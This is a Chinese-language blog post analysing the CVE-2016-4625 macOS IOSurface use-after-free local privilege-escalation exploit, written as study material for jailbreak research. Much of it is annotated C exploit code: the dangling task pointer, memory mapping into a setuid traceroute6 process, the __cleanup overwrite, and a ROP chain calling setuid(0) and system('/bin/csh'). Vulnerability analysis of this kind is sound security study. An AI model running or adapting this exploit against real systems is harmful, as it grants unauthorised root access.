<!DOCTYPE html><html lang="zh-CN"><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description"><title>浅谈 CVE-2016-4625 exploit | FloatingGuy's Blog</title><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/normalize/5.0.0/normalize.min.css"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/pure/0.6.2/pure-min.css"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/pure/0.6.2/grids-responsive-min.css"><link rel="stylesheet" type="text/css" href="/css/style.css?v=0.0.0"><link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="//cdn.bootcss.com/jquery/3.1.1/jquery.min.js"></script><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.ico"><link rel="apple-touch-icon" href="/apple-touch-icon.png"><link rel="apple-touch-icon-precomposed" href="/apple-touch-icon.png"><link rel="alternate" type="application/atom+xml" href="/atom.xml"></head><body><div class="body_container"><div id="header"><div class="site-name"><h1 class="hidden">浅谈 CVE-2016-4625 exploit</h1><a id="logo" href="/.">FloatingGuy's Blog</a><p class="description"></p></div><div id="nav-menu"><a href="/." class="current"><i class="fa fa-home"> 首页</i></a><a href="/archives/"><i class="fa fa-archive"> 归档</i></a><a href="/about/"><i class="fa fa-user"> 关于</i></a><a href="/atom.xml"><i class="fa fa-rss"> 订阅</i></a></div></div><div id="layout" class="pure-g"><div class="pure-u-1 pure-u-md-3-4"><div class="content_container"><div class="post"><h1 class="post-title">浅谈 CVE-2016-4625 exploit</h1><div class="post-content"><p>作者：FloatingGuy 转载请注明出处：<a href="https://floatingguy.github.io/" target="_blank" rel="external">https://floatingguy.github.io/</a></p>
<hr>
<p>(本人第一次接触 OSX 系统，这篇文章对我来说难度还是比较大的，本人水平有限文章难免有错，请路过的大牛多多指点，轻拍)</p>
<p>本文是为分析 yalu102越狱工具做铺垫，这个漏洞并没有在 yalu越狱中被使用，因为这个漏洞是 macOS 中的。<br>分析本文是为了学习 XNU 中 task 结构体存在的分险并且结合 port 来实现提权的原理。</p>
<a id="more"></a>
<p>预备知识：</p>
<ul>
<li>IOKit 开发基础知识</li>
<li>Mach Port 通信基础知识</li>
</ul>
<h3 id="漏洞分析："><a href="#漏洞分析：" class="headerlink" title="漏洞分析："></a>漏洞分析：</h3><p>IOSurface是基于 IOKit的一个扩展模块，IOUserClient 的扩展类IOSurfaceRootUserClient 的成员fTask（0xf）引用了用户空间的 task struct 指针，但是没有修改task的引用计数器，由此产生了一个 UAF 漏洞。如果task 对应的进程被杀死，task struct 对象会被回收，IOSurfaceRootUserClient 成员fTask 就变成了一个 悬挂指针。</p>
<p>Apple 在其开发者网站上提供了一份 IOKit 扩展设计样式的示例 AppleSamplePCI。因为示例中存在dangling 指针漏洞，所以 Ian Beer 就去 IOSurface 模块中查找对应的代码，利用 IOSurface 模块中的 dangling 漏洞来执行任意代码。因为这个开发模板中存在漏洞所以会影响 Apple 开发的所有IOKit 子模块。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//AppleSamplePCI.kext implementation of initWithTask</span></div><div class="line"><span class="keyword">bool</span> SamplePCIUserClientClassName::initWithTask(</div><div class="line">  <span class="keyword">task_t</span> owningTask,</div><div class="line">  <span class="keyword">void</span>* securityID,</div><div class="line">  UInt32 type,</div><div class="line">  OSDictionary* properties)</div><div class="line">&#123;</div><div class="line">  <span class="keyword">bool</span> success = super::initWithTask(owningTask,</div><div class="line">                                     securityID,</div><div class="line">                                     type,</div><div class="line">                                     properties);</div><div class="line">  fTask = owningTask;       <span class="comment">//bug 悬挂指针</span></div><div class="line">  fDriver = <span class="literal">NULL</span>;</div><div class="line"></div><div class="line">  <span class="keyword">return</span> success;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<h3 id="漏洞利用思想："><a href="#漏洞利用思想：" class="headerlink" title="漏洞利用思想："></a>漏洞利用思想：</h3><p><img src="/include/img/4625/exploit-all.jpg" alt="exploit-all"></p>
<p>此漏洞的提权思想很简单，因为不受沙盒的限制所以还可以用来做沙盒绕过。<br><strong>exploit的核心就是将 shellcode注入到所有者是root 用户并且拥有 s执行权限的子进程中，这个进程开启的 shell 是root用户的， shellcode可以直接作为子进程的参数传递到栈上。</strong></p>
<p>shellcode 本身很简单，重点在第3-4步将子进程的执行权限窃取到 shellcode 上，并且要精准计算栈的偏移量。<br>其他还有一下技巧性的东西，比如第2步如何控制子进程让其在退出前阻塞、如何将子进程的 task port 发送到父进程中。<br>（下文可能会出现上面流程图中的编号，请根据上下文识别）</p>
<h3 id="分析-exploit"><a href="#分析-exploit" class="headerlink" title="分析 exploit"></a>分析 exploit</h3><p>这里会分成2部分：</p>
<ol>
<li>准备阶段，负责提供一个触发漏洞的环境和执行负载的环境。</li>
<li>攻击阶段，分析如何使用漏洞来达到劫持控制流、任意地址写以及 shellcode 的功能。</li>
</ol>
<h4 id="准备阶段"><a href="#准备阶段" class="headerlink" title="准备阶段"></a>准备阶段</h4><p>将parent 的port 传递给child， 然后让child 将其task port 传递给 parent的步骤：</p>
<ol>
<li>父进程通过task_get_special_port获取他的special ports，并存储在局部变量中。special ports是一些连接着系统服务的port，在fork的过程中，子进程会继承special port。</li>
<li>父进程通过mach_port_allocate函数创建一个新的port，通过task_set_special_port将这个新的port设为special port，且通过mach_port_insert_right为这个新的port赋予写的权限。并最终试图将这个新的port传递给子进程。</li>
<li>父进程进行fork，子进程继承了<a href="https://googleprojectzero.blogspot.kr/2016/10/taskt-considered-harmful.html" target="_blank" rel="external">2</a>中创建的新的port，作为自己的special port。</li>
<li>父进程将保存的在临时变量中的special port，重新设置回来。</li>
<li>子进程获取这个替换过的special port，并且保存下来。</li>
<li>子进程通过继承的special port和父进程通信。</li>
<li>父进程在收到子进程的消息后，将当前的special port再发送给子进程。</li>
<li>子进程也将收到的special port设置为自己的special port。</li>
<li>子进程将自己的 task port 发送给父进程</li>
</ol>
<p>对应的流程图：<br><img src="/include/img/4625/port_dance.jpg" alt="port-dance"></p>
<p>port dancer主要的目的是将子进程的 task port传递给父进程，父进程可以使用子进程的 task port创建 IOSurface 的 userclient 对象。</p>
<h4 id="攻击阶段"><a href="#攻击阶段" class="headerlink" title="攻击阶段"></a>攻击阶段</h4><p>上一节我们已经获取 子进程的 task port, 那么现在就可以 将子进程的 task port 传递给 IOSurface 制造一个悬挂指针，接下来可以重新开启一个子进程 运行tracerout6来偷梁换柱了，然后想办法获取写子进程内存的权限，通过覆盖子进程的函数指针__cleanup获取控制流执行 shellcode。</p>
<p>按照执行顺序将攻击流程分成2部分:</p>
<pre><code>1. 覆盖子进程__cleanup函数指针
2. 执行 shellcode。
</code></pre><ol>
<li><p>覆盖子进程__cleanup 函数指针<br> 要 overwrite 首先要任意地址写。IOSurface 框架可以做到这一点，看雪翻译的一篇<a href="http://bbs.pediy.com/thread-215839.htm" target="_blank" rel="external">文章</a>中介绍，IOSurface框架提供了适用于跨进程共享的框架缓冲对象,IOSurfaces仅仅用来包裹共享内存缓冲区。</p>
<ul>
<li><p>IOSurfaceRootUserClient::create_surface() 接受一个键值对作为参数来创建共享内存对象，其他进程可以把这个对象映射到它们自己的地址空间中。<br>参数：<br>  IOSurfaceAddress -&gt; target_addr<br>  IOSurfaceAllocSize -&gt; 0x1000<br>  IOSurfacesGlobal-&gt;True    允许其他 ioSurface 访问 当前 iosurface 对象。</p>
</li>
<li><p>IOSurfaceRootUserClient::lookup_surface()将目标进程的内存共享对象，映射到当前进程。</p>
</li>
</ul>
</li>
</ol>
<p><em>使用上面的代码， 可以将目标进程 的 iosurface 创建的共享内存 地址 target-addr 开始的0x1000 大小的内存</em></p>
<p>我们要 root 就需要在 获取共享内存对象之前，将 fTask 指向的 task 对象换成一个 更高权限的 进程的 task 结构体。这样我们就可以获取到 包裹高权限的 进程的共享内存对象了。</p>
<p>下面分析 准备阶段的代码<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">io_connect_t</span> dangler = get_uc(child_task_port);        [<span class="number">0</span>] 使用 child task 创建一个 iosurface 对象，返回 iosurface 对象的 <span class="function">port</span></div><div class="line"></div><div class="line">  <span class="title">printf</span><span class="params">(<span class="string">"got dangler\n"</span>)</span>;</div><div class="line"></div><div class="line">  mach_port_deallocate(mach_task_self(), child_task_port); [<span class="number">1</span>] 杀死子进程</div><div class="line">  kill(child_pid, <span class="number">9</span>);</div><div class="line"> ...</div><div class="line"></div><div class="line">  <span class="keyword">int</span> target_pid = <span class="number">0</span>;</div><div class="line">  <span class="keyword">int</span> blocker = fork_and_exec_blocking(<span class="string">"/usr/sbin/traceroute6"</span>, argv, <span class="literal">NULL</span>, &amp;target_pid);        [<span class="number">2</span>] 创建一个高权限的进程，替换 fTask 对象</div><div class="line"></div><div class="line"><span class="comment">// 构造create_surface 的参数 dictionary</span></div><div class="line">  CFMutableDictionaryRef surface_props = CFDictionaryCreateMutable(kCFAllocatorDefault,</div><div class="line">                                                                   <span class="number">0</span>,</div><div class="line">                                                                   &amp;kCFTypeDictionaryKeyCallBacks,</div><div class="line">                                                                   &amp;kCFTypeDictionaryValueCallBacks);</div><div class="line"></div><div class="line">  <span class="keyword">uint64_t</span> target_addr = fptr_page;</div><div class="line">  <span class="keyword">uint32_t</span> target_size = <span class="number">0x1000</span>;</div><div class="line"></div><div class="line"><span class="comment">// 向 dictionary 中添加 目标进程的共享内存其实地址 + 共享内存大小</span></div><div class="line">  CFDictionarySetValue(surface_props, CFSTR(<span class="string">"IOSurfaceAddress"</span>), CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt64Type, &amp;target_addr));</div><div class="line">  CFDictionarySetValue(surface_props, CFSTR(<span class="string">"IOSurfaceAllocSize"</span>), CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt32Type, &amp;target_size));</div><div class="line">  CFDictionarySetValue(surface_props, CFSTR(<span class="string">"IOSurfaceIsGlobal"</span>), kCFBooleanTrue);</div><div class="line"></div><div class="line">  CFDataRef props_data = IOCFSerialize(surface_props, kNilOptions);</div><div class="line">  <span class="keyword">void</span>* inputStruct = (<span class="keyword">void</span>*)CFDataGetBytePtr(props_data);</div><div class="line">  <span class="keyword">size_t</span> inputStructCnt = (<span class="keyword">size_t</span>)CFDataGetLength(props_data);</div><div class="line"></div><div class="line">  <span class="keyword">uint64_t</span> inputScalar[<span class="number">16</span>];</div><div class="line">  <span class="keyword">size_t</span> inputScalarCnt = <span class="number">0</span>;</div><div class="line"></div><div class="line">  <span class="keyword">uint64_t</span> outputScalar[<span class="number">16</span>];</div><div class="line">  <span class="keyword">uint32_t</span> outputScalarCnt = <span class="number">0</span>;</div><div class="line"></div><div class="line">  <span class="keyword">char</span> outputStruct[<span class="number">0x548</span>];</div><div class="line">  <span class="keyword">size_t</span> outputStructCnt = <span class="number">0x548</span>;</div><div class="line"></div><div class="line">  <span class="comment">// create_surface</span></div><div class="line">  <span class="keyword">int</span> selector = <span class="number">0</span>;</div><div class="line"></div><div class="line">  err = IOConnectCallMethod(                    [<span class="number">3</span>] 调用 create_surface 函数，在目标进程中创建 共享内存对象</div><div class="line">          dangler,</div><div class="line">          selector,</div><div class="line">          inputScalar,</div><div class="line">          inputScalarCnt,</div><div class="line">          inputStruct,</div><div class="line">          inputStructCnt,</div><div class="line">          outputScalar,</div><div class="line">          &amp;outputScalarCnt,</div><div class="line">          outputStruct,</div><div class="line">          &amp;outputStructCnt);</div><div class="line"></div><div class="line">说明： 在这提一下iokit 扩展通信都是通过 selector 来代替函数名。</div><div class="line"></div><div class="line"><span class="keyword">int</span> target_surface_id = *(<span class="keyword">int</span>*)(&amp;outputStruct[<span class="number">0x10</span>]);</div><div class="line"></div><div class="line">  <span class="keyword">io_connect_t</span> surface = get_uc(mach_task_self());            [<span class="number">4</span>] 使用 parent task 创建一个 iosurface 对象，返回 iosurface 对象的 port</div><div class="line"></div><div class="line">  inputStruct = <span class="literal">NULL</span>;</div><div class="line">  inputStructCnt = <span class="number">0</span>;</div><div class="line"></div><div class="line">  inputScalar[<span class="number">0</span>] = target_surface_id;</div><div class="line">  inputScalarCnt = <span class="number">1</span>;</div><div class="line"></div><div class="line">  outputStructCnt = <span class="number">0x548</span>;</div><div class="line"></div><div class="line">  <span class="comment">// lookup_surface</span></div><div class="line">  selector = <span class="number">6</span>;</div><div class="line"></div><div class="line">  err = IOConnectCallMethod(                                    [<span class="number">5</span>] 调用lookup_surface函数， 将目标进程的共享内存映射到 parent 进程</div><div class="line">          surface,</div><div class="line">          selector,</div><div class="line">          inputScalar,</div><div class="line">          inputScalarCnt,</div><div class="line">          inputStruct,</div><div class="line">          inputStructCnt,</div><div class="line">          outputScalar,</div><div class="line">          &amp;outputScalarCnt,</div><div class="line">          outputStruct,</div><div class="line">          &amp;outputStructCnt);</div><div class="line"></div><div class="line">  <span class="keyword">char</span>* shared_page = *(<span class="keyword">char</span>**)(&amp;outputStruct[<span class="number">0</span>]);</div><div class="line">  shared_page[<span class="number">0</span>] = ‘B’;</div><div class="line">  *(<span class="keyword">uint64_t</span>*)(shared_page+fptr_offset) = stack_shift_gadget;                [<span class="number">6</span>] 第一段 gadget 地址覆盖 目标进程的__cleanup 函数指针</div><div class="line"></div><div class="line"><span class="comment">// 下一节 介绍</span></div><div class="line">  unblock_pipe_and_interact(blocker);</div><div class="line"></div><div class="line">  <span class="keyword">int</span> sl;</div><div class="line">  wait(&amp;sl);</div></pre></td></tr></table></figure></p>
<p>上述 1-6 步就是parent获取child共享内存的原语， 并且覆盖了目标进程的 __cleanup 全局变量。<br>步骤 2 中还使用了一个技巧<a href="阻塞进程">3</a>使得child进程能在 exit 之前阻塞，等待parent映射内存设置 shellcode。</p>
<p>总结一下</p>
<ol>
<li><p>让child task 阻塞的原语<br>给 traceroute6 一个无效参数traceroute6会使用 strerr 标准错误输出错误信息，但是 parent 使用管道pip_write 替换了标准错误输出，并且管道已经阻塞了所以traceroute6卡在程序中无法调用exit 函数。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"traceroute6: invalid wait time.\n"</span>);</div><div class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</div></pre></td></tr></table></figure>
</li>
<li><p>parent将child task的1页内存映射到自己的内存空间的原语<br>上面 提到了细节<br>这里 映射的是  libsystem_c.dylib:<strong>DATA ，其中包含了 </strong>cleanup 函数指针的地址。（这个地址要用 add_gadget 的地址去覆盖， exit 的时候会调用这个函数）</p>
</li>
</ol>
<h4 id="shellcode-分析"><a href="#shellcode-分析" class="headerlink" title="shellcode 分析"></a>shellcode 分析</h4><p>创建 shellcode 的代码在 setup_payload_and_offsets 函数中，要覆盖 DATA段的__cleanup 函数指针首先要获取其位置然后查找几段 gadget，执行的数序是：</p>
<ul>
<li>修改 rsp,跳转到 traceroute6 进程栈的参数区</li>
<li>大量的 ret slide 指令，提高shellcode 的兼容性</li>
<li>执行 setuid(0)的 shellcode</li>
<li>执行 system(“/bin/csh”)的 shellcode</li>
</ul>
<p>下面继续分析代码。</p>
<p>参数说明:</p>
<pre><code>stack_shift : 第一段 gadget 的地址
fptr_page : 目标进程建立共享内存的起始地址
fptr_offset : __cleanup 相对 fptr_page 的偏移
</code></pre><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">char</span>** <span class="title">setup_payload_and_offsets</span><span class="params">(<span class="keyword">uint64_t</span>* stack_shift, <span class="keyword">uint64_t</span>* fptr_page, <span class="keyword">uint32_t</span>* fptr_offset)</span> </span>&#123;</div><div class="line"></div><div class="line">   <span class="comment">// &amp;__cleanup: __DATA 段中 __cleanup 的地址</span></div><div class="line">   <span class="comment">// __cleanup : 是 libsystem_c.dylib 中对应函数的地址</span></div><div class="line">  *fptr_page = (<span class="keyword">uint64_t</span>)((<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span>)(&amp;__cleanup) &amp; ~(<span class="number">0xfff</span>ULL));        [<span class="number">0</span>] 代码段内存共享，所以各个进程中__cleanup地址都一样</div><div class="line">  *fptr_offset = ((<span class="keyword">uint64_t</span>)(&amp;__cleanup)) - *fptr_page;</div><div class="line"></div><div class="line">  <span class="comment">//[1] 搜索 ret 指令</span></div><div class="line">  <span class="keyword">uint8_t</span>* ret = (<span class="keyword">uint8_t</span>*)&amp;<span class="built_in">strcpy</span>; <span class="comment">// the start of libsystem_c</span></div><div class="line">  <span class="keyword">do</span> &#123;</div><div class="line">    ret += <span class="number">1</span>;</div><div class="line">    ret = memmem(ret, <span class="number">0x1000000</span>, <span class="string">"\xc3"</span>, <span class="number">1</span>);   <span class="comment">//search 'ret'</span></div><div class="line">  &#125; <span class="keyword">while</span> (ret != <span class="literal">NULL</span> &amp;&amp; ((count_nulls((<span class="keyword">uint64_t</span>)ret)) != <span class="number">2</span>) );</div><div class="line">..</div><div class="line">  <span class="comment">//[2]. pop rdi; ret gadget</span></div><div class="line">  <span class="keyword">uint8_t</span>* pop_rdi_ret = memmem(&amp;<span class="built_in">strcpy</span>, <span class="number">0x1000000</span>, <span class="string">"\x5f\xc3"</span>, <span class="number">2</span>);</div><div class="line">  <span class="keyword">if</span> (pop_rdi_ret == <span class="literal">NULL</span>) &#123;</div><div class="line">    FAIL(<span class="string">"couldn't find pop rdi; ret gadget\n"</span>);</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  <span class="comment">//[3]. /bin/sh string:</span></div><div class="line">  <span class="keyword">void</span>* bin_sh = ((<span class="keyword">char</span>*)__cleanup)-(<span class="number">1024</span>*<span class="number">1024</span>); <span class="comment">// start from 1MB below this symbol in libsystem_c.dylib</span></div><div class="line">  bin_sh = memmem(bin_sh, <span class="number">2</span>*<span class="number">1024</span>*<span class="number">1024</span>, <span class="string">"/bin/csh"</span>, <span class="number">9</span>);</div><div class="line">  <span class="keyword">if</span> (bin_sh == <span class="literal">NULL</span>) &#123;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"couldn't find /bin/sh string\n"</span>);</div><div class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</div><div class="line">  &#125;</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">//[4]. 搜索 修改 rsp 的 gadget</span></div><div class="line"></div><div class="line"><span class="keyword">uint8_t</span>* stack_shift_gadget = memmem(&amp;realpath, <span class="number">0x4000</span>, <span class="string">"\x48\x81\xc4"</span>, <span class="number">3</span>);</div><div class="line">  <span class="keyword">if</span> (stack_shift == <span class="literal">NULL</span>) &#123;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"couldn't find stack shift\n"</span>);</div><div class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</div><div class="line">  &#125;</div><div class="line"></div><div class="line"><span class="comment">// libsystem_c.dylib`realpath$DARWIN_EXTSN:</span></div><div class="line"><span class="comment">// 0x7fffa333ab47 &lt;+1908&gt;: addq   $0x1d98, %rsp             ; imm = 0x1D98</span></div><div class="line"><span class="comment">// 0x7fffa333ab4e &lt;+1915&gt;: popq   %rbx</span></div><div class="line"><span class="comment">// 0x7fffa333ab4f &lt;+1916&gt;: popq   %r12</span></div><div class="line"><span class="comment">// 0x7fffa333ab51 &lt;+1918&gt;: popq   %r13</span></div><div class="line"><span class="comment">// 0x7fffa333ab53 &lt;+1920&gt;: popq   %r14</span></div><div class="line"><span class="comment">// 0x7fffa333ab55 &lt;+1922&gt;: popq   %r15</span></div><div class="line"><span class="comment">// 0x7fffa333ab57 &lt;+1924&gt;: popq   %rbp</span></div><div class="line"><span class="comment">// 0x7fffa333ab58 &lt;+1925&gt;: retq</span></div><div class="line"></div><div class="line">  <span class="comment">//获取 add rsp 的立即数</span></div><div class="line">  <span class="keyword">uint32_t</span> realpath_shift_amount = *(<span class="keyword">uint32_t</span>*)(stack_shift_gadget+<span class="number">3</span>);  <span class="comment">//0x1d98 </span></div><div class="line"></div><div class="line">  <span class="comment">// 这里预测 traceroute6 的栈大小</span></div><div class="line">  <span class="keyword">uint32_t</span> traceroute6_stack_size = <span class="number">0x948</span>;</div><div class="line"></div><div class="line">  <span class="keyword">if</span> (realpath_shift_amount - <span class="number">0x200</span> &lt; traceroute6_stack_size) &#123;</div><div class="line">    <span class="comment">//add rsp, xxx  这个值不够大，无法跳转到 argv 区</span></div><div class="line">    <span class="built_in">printf</span>(<span class="string">"that stack shift gadget probably isn't big enough...\n"</span>);</div><div class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</div><div class="line">  &#125;</div><div class="line">    </div><div class="line">  *stack_shift = (<span class="keyword">uint64_t</span>)stack_shift_gadget;</div><div class="line"></div><div class="line"><span class="keyword">int</span> ret_slide_length = ((realpath_shift_amount - traceroute6_stack_size) / <span class="number">8</span> / <span class="number">5</span>) * <span class="number">2</span>;</div><div class="line"></div><div class="line"></div><div class="line">  <span class="keyword">char</span>* progname = <span class="string">"/usr/sbi"</span> <span class="comment">//8</span></div><div class="line">                   <span class="string">"n/tracer"</span> <span class="comment">//8</span></div><div class="line">                   <span class="string">"oute6"</span>;   <span class="comment">//6</span></div><div class="line">  <span class="keyword">char</span>* optname  = <span class="string">"-w"</span>;      <span class="comment">//3</span></div><div class="line">  <span class="keyword">char</span>* optval   = <span class="string">"LOLLLL"</span>;  <span class="comment">//7</span></div><div class="line"></div><div class="line"><span class="comment">// 这里 『+6』 是因为 ret slide 后面 还有 pop_rdi_ret 到&amp;system 6条指令。</span></div><div class="line">  <span class="keyword">size_t</span> target_argv_rop_size = (ret_slide_length + <span class="number">6</span>)* <span class="number">8</span>; <span class="comment">// ret slides plus slots for the actual rop</span></div><div class="line"></div><div class="line">  <span class="keyword">uint8_t</span>** args_u64 = <span class="built_in">malloc</span>(target_argv_rop_size + <span class="number">1</span>); <span class="comment">// plus extra NULL byte at the end</span></div><div class="line">  <span class="keyword">char</span>* args = (<span class="keyword">char</span>*)args_u64;</div><div class="line">  <span class="built_in">memset</span>(args, <span class="number">0</span>, target_argv_rop_size + <span class="number">1</span>);</div><div class="line"></div><div class="line">  <span class="comment">// ret-slide  写入堆中</span></div><div class="line">  <span class="keyword">int</span> i;</div><div class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; ret_slide_length; i++) &#123;</div><div class="line">    args_u64[i] = ret;</div><div class="line">  &#125;</div><div class="line">【<span class="number">0</span>】 提权的 shellcode</div><div class="line">  args_u64[i] = pop_rdi_ret;</div><div class="line">  args_u64[i+<span class="number">1</span>] = <span class="number">0</span>;</div><div class="line">  args_u64[i+<span class="number">2</span>] = (<span class="keyword">uint8_t</span>*)&amp;setuid;</div><div class="line">  args_u64[i+<span class="number">3</span>] = pop_rdi_ret;</div><div class="line">  args_u64[i+<span class="number">4</span>] = bin_sh;</div><div class="line">  args_u64[i+<span class="number">5</span>] = (<span class="keyword">uint8_t</span>*)&amp;system;</div><div class="line"></div><div class="line">  <span class="comment">// allocate worst-case size</span></div><div class="line">   <span class="comment">// malloc 足够大的空间来保存 shellcode </span></div><div class="line">  <span class="keyword">size_t</span> argv_allocation_size = (ret_slide_length+<span class="number">100</span>)*<span class="number">8</span>*<span class="number">8</span>;</div><div class="line">  <span class="keyword">char</span>** target_argv = <span class="built_in">malloc</span>(argv_allocation_size);</div><div class="line">  <span class="built_in">memset</span>(target_argv, <span class="number">0</span>, argv_allocation_size);</div><div class="line"><span class="comment">// 【1】 设置启动参数 /usr/sbin/traceroute6 -w  LOLLLL</span></div><div class="line">  target_argv[<span class="number">0</span>] = progname;</div><div class="line">  target_argv[<span class="number">1</span>] = optname;</div><div class="line">  target_argv[<span class="number">2</span>] = optval;</div><div class="line">  <span class="keyword">int</span> argn = <span class="number">3</span>;</div><div class="line"></div><div class="line">  <span class="comment">//【2】将 ret 数组的地址写入到 argv 中</span></div><div class="line">  target_argv[argn++] = &amp;args[<span class="number">0</span>];</div><div class="line">  <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; target_argv_rop_size; i++) &#123;</div><div class="line">    <span class="keyword">if</span> (args[i<span class="number">-1</span>] == <span class="number">0</span>) &#123;</div><div class="line">      target_argv[argn++] = &amp;args[i];</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">  target_argv[argn] = <span class="literal">NULL</span>;</div><div class="line"></div><div class="line">  <span class="keyword">return</span> target_argv;</div></pre></td></tr></table></figure>
